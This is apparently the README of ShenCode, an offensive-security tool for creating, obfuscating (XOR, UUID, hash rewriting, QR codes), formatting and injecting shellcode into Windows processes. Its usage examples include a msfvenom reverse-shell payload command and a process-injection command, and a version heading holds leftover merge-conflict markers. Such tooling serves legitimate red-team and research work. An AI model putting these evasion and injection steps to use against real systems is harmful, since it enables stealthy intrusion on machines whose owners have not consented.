# ShenCode

A multi purpose tool for shellcode operations

I am developing under Windows. This release brings some compatibility fixes for Kali Linux. `inject` and `ROR2ROL` are Windows dependent. All other features are now available for Kali and maybe other Posix OS.

![](shencode-042.png)

## Features

<<<<<<< Updated upstream
### Version 0.4.3
=======
### Version 0.5.0
>>>>>>> Stashed changes

- create
	- create shellcodes with msfvenom
- encode
	- `ROR13` to `ROL` with custom key (only Windows)
	- `QR-Code`: hide OpCodes as QR-Code image
	- `XOR` encryption
	- `UUID` obfuscation - Please, check out my [Blog Post](https://www.nosociety.de/en:it-security:blog:obfuscation_shellcode_als_uuids_tarnen_-_teil_1) about this encoder
- extract
	- extract shellcode from position `x` to `y`
- inject
	- inject shellcode into a remote process (only Windows)
- output
	- raw shellcode to file
	- formatting options: `C++, C#, C-ASM, PS, PY, HEX`
	- new `inspect` option helps to find offsets
	- output in console windows
	- output in template

## ToDo

- automatical compile feature
- integrate more frameworks
- integrate more encoder

## How to use

### create shellcode

`python shencode.py create --cmd="-p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4443 -f raw -o payload.bin"`
### encode shellcode


| Encoder          | Arguments                                                              |
| ---------------- | ---------------------------------------------------------------------- |
| **ROR13 to ROL** | `encode --filename shell.raw --outputfile shell.enc --key 33`          |
| **QR-Code**      | `encode --filename shell.raw --outputfile shell.enc --qrcode`          |
| **UUID**         | `encode --filename shell.raw --uuid`                                   |
| **XOR**          | `encode --filename shell.raw --outputfile shell.enc --xor --xorkey 96` |

### extract shellcode

`python shencode.py extract --filename bin.o --outputfile shell.raw --first-byte 6 --last-byte 128`
### inject shellcode

`python shencode.py inject --filename calc.raw --processname notepad.exe --startprocess`
### output in different styles

#### console output

`python shencode.py -o {c, casm, cs, ps1, py, hex} <commands>`

Check [this repository](https://github.com/psycore8/bin2shellcode) for more information regarding the output.

#### inspect output

`python shencode.py output --filename inputfile --syntax inspect`

Output hex in 8 byte: `0x00000008: 48 31 c0 48 89 45 f8 48`

#### write output to a template file

`python shencode.py output --filename inputfile --write templatefile --syntax c`

This command replaces a `!++BUFFER++!` placeholder in the given file e.g.

```cpp
unsigned char buf[] =
!++BUFFER++!
```

will be replaced by the generated shellcode

```cpp
unsigned char buf[] =
"\x90\x01\..\xff";
```

## Config

Make sure your metasploit binary folder is in your PATH variable

## Parameter

Please [refer to the wiki](https://github.com/psycore8/shencode/wiki) for a full parameter list.

| **Command** | **Subcommand** | **Short** | **Description**                                                                       | Requires  |
| ----------- | -------------- | --------- | ------------------------------------------------------------------------------------- | --------- |
| create      |                |           | create a shellcode using msfvenom                                                     |           |
|             | --cmd          | -c        | msfvenom command line, use quotation marks and equal sign e.g --cmd=\"-p ...\"        |           |
| encode      |                |           | Shellcode encoding                                                                    |           |
|             | --filename     | -f        | raw input file with shellcode                                                         |           |
|             | --outputfile   | -o        | raw output file                                                                       |           |
|             | --ror2rol      | -r        | encode windows function hashes to ROL                                                 | -f -o -rk |
|             | --key          | -rk       | ROL key for encoding                                                                  |           |
|             | --qrcode       | -q        | Create a QR Code from Shellcode                                                       | -f        |
|             | --xor          | -x        | use additional XOR encoding                                                           | -f -o -xk |
|             | --xorkey       | -xk       | XOR key for encoding                                                                  |           |
|             | --uuid         | -u        | Obfuscate Shellcode as UUID                                                           | -f        |
| extract     |                |           |                                                                                       |           |
|             | --filename     | -f        | binary input file                                                                     |           |
|             | --outputfile   | -o        | name of the outputfile                                                                |           |
|             | --first-byte   | -fb       | first byte to extract                                                                 | -f -o     |
|             | --last-byte    | -lb       | last byte to extract                                                                  |           |
| inject      |                |           | inject shellcode                                                                      |           |
|             | --filename     | -f        | raw input file with shellcode to inject                                               |           |
|             | --processname  | -p        | process name to inject                                                                |           |
|             | --startprocess | -s        | if set, process will be started                                                       |           |
| output      |                |           | create formatted output by filename                                                   |           |
|             | --filename     | -f        | raw input file with shellcode                                                         |           |
|             | --lines        | -l        | adding line offsets                                                                   | -f -s     |
|             | --syntax       | -s        | formatting the shellcode, choose between `c, casm, cs, hex, inspect, ps1, py`         |           |
|             | --write        | -w        | write output to the given filename (replacing  `!++BUFFER++!` placeholder in the file |           |
| --output    |                |           | formatting the shellcode in C, Casm, C#, Powershell, python or hex                    |           |

## References

- [Function Name Hashing](https://www.bordergate.co.uk/function-name-hashing/)
- [Win32API with python3 injection](https://systemweakness.com/win32api-with-python3-part-iii-injection-6dd3c1b99c90)
- [Violent python: XOR Encryption](https://samsclass.info/124/proj14/VPxor.htm)
- [How to easily encrypt file in python](https://www.stackzero.net/how-to-easily-encrypt-file-in-python/)
